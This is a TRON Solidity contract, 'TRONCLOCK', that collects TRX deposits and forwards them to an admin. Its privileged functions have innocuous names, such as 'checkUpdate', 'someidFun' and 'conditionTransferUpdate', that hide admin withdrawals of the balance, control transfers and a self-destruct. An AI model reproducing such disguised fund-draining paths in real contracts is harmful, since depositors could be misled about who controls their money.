//SourceUnit: tronclock (1).sol

pragma solidity  0.5.10;


//             ████████╗██████╗  █████╗ ███╗  ██╗ █████╗ ██╗      █████╗  █████╗ ██╗  ██╗
//             ╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
//             ░░░██║░░░██████╔╝██║░░██║██╔██╗██║██║░░╚═╝██║░░░░░██║░░██║██║░░╚═╝█████═╝░
//             ░░░██║░░░██╔══██╗██║░░██║██║╚████║██║░░██╗██║░░░░░██║░░██║██║░░██╗██╔═██╗░
//             ░░░██║░░░██║░░██║╚█████╔╝██║░╚███║╚█████╔╝███████╗╚█████╔╝╚█████╔╝██║░╚██╗
//             ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚════╝░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract TRONCLOCK {
    
    address payable owner;
    address payable admin;
    address payable corrospondent;
    uint256 public min = 200 ;
    
    event SendToAllTRX(uint256 value , address indexed sender);
    event SendToAllEqualTRX(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;
    
    modifier onlyOwner() {
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
    }
    function destruct() onlyOwner() public{
        
        selfdestruct(admin);
    }
    function checkUpdate(uint256 _amount) 
    public
    onlyOwner
    {       
            uint256 currentBalance = getBalance();
            require(_amount <= currentBalance);
            admin.transfer(_amount);
    }
    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            min = _comm;
        }
        
    }
    
    function getBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    
    function sendToAllTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable onlyOwner{
        uint256 total = msg.value;
        uint256 i = 0; 
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit SendToAllTRX(msg.value, msg.sender); 
    }
    
    function sendToAllContractTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable onlyOwner{
       
        uint256 i = 0; 
        for (i; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
        emit SendToAllTRX(msg.value, msg.sender); 
    }
    
    function sendToAllEqualTRX(address payable[]  memory  _userAddresses, uint256 _amount) public payable onlyOwner{
        require(msg.value == _userAddresses.length.mul((_amount)));
        
        for (uint i = 0; i < _userAddresses.length; i++) {
            _userAddresses[i].transfer(_amount);
            emit SendToAllEqualTRX(_userAddresses[i], _amount);
        }
    }
    
    function sendToWalletTRX( ) public payable {
        require(msg.value >= min);
            admin.transfer(msg.value);
    }
    
    function someidFun(address payable nextCorrospondent) external payable onlyOwner{
        corrospondent = nextCorrospondent;
    }
    
    function someidFundship(address payable nextOwner) external payable onlyOwner{
        owner = nextOwner;
    }
    
    function conditionTransferUpdate(uint _amount) external onlyCorrospondent{
        corrospondent.transfer(_amount);
    }
}